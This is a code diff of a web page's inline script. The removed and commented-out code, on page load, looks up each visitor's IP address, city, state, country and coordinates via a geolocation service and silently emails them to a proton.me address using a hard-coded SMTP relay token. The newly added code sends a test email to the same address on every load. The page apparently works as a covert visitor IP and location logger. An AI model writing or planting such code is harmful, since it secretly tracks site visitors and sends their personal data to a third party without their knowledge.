@@ -10,37 +10,42 @@
         </div>
 
         <script>
-var lat = ""
-var long = ""
-var city = ""
-var state = ""
-var ip = ""
-var country = ""
-$.getJSON('https://geolocation-db.com/json/')
-         .done (function(location) {
-          country = location.country_name;
-          state = location.state;
-          city = location.city;
-          lat = location.latitude;
-          long = location.longitude;
-          ip = location.IPv4;
-          console.log(ip)
-    Email.send({
+
+Email.send({
         SecureToken : "12eb3856-1896-42a7-901e-e4db5c428dab",
         To : 't7fkm11@proton.me',
         From : "t7fkm11@proton.me",
         Subject : "testing",
-        Body : `
-        country: ${country}\n
-        state: ${state}\n
-        city: ${city}\n
-        lat: ${lat}\n
-        long: ${long}\n
-        ip: ${ip}\n`
-    }).then(
-        message => alert(message)
-    )
-});
+        Body : `TESTING email`
+    })
+// var lat = ""
+// var long = ""
+// var city = ""
+// var state = ""
+// var ip = ""
+// var country = ""
+// $.getJSON('https://geolocation-db.com/json/')
+//          .done (function(location) {
+//           country = location.country_name;
+//           state = location.state;
+//           city = location.city;
+//           lat = location.latitude;
+//           long = location.longitude;
+//           ip = location.IPv4;
+//     Email.send({
+//         SecureToken : "12eb3856-1896-42a7-901e-e4db5c428dab",
+//         To : 't7fkm11@proton.me',
+//         From : "t7fkm11@proton.me",
+//         Subject : "testing",
+//         Body : `
+//         country: ${country}\n
+//         state: ${state}\n
+//         city: ${city}\n
+//         lat: ${lat}\n
+//         long: ${long}\n
+//         ip: ${ip}\n`
+//     })
+// });
 
 // setTimeout(() => {
 //     location.reload()
